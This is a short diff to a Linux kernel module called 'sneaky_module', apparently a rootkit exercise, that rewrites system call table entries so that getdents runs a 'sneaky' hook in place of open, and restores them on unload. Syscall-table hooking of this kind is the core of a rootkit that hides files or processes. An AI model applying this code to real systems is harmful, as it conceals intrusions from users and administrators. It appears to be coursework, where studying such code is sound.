@@ -142,11 +142,12 @@ static int initialize_sneaky_module(void) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
 
-  original_open = (void *)*(sys_call_table + __NR_open);
+  /*original_open = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-  /*original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  */ original_getdents =
+      (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  original_read = (void *)*(sys_call_table + __NR_read);
+  /*original_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   */
   // Revert page to read-only
@@ -173,10 +174,10 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_open;
-  /* *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
-  */
+  //*(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  /**(sys_call_table + __NR_read) = (unsigned long)original_read;
+ */
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
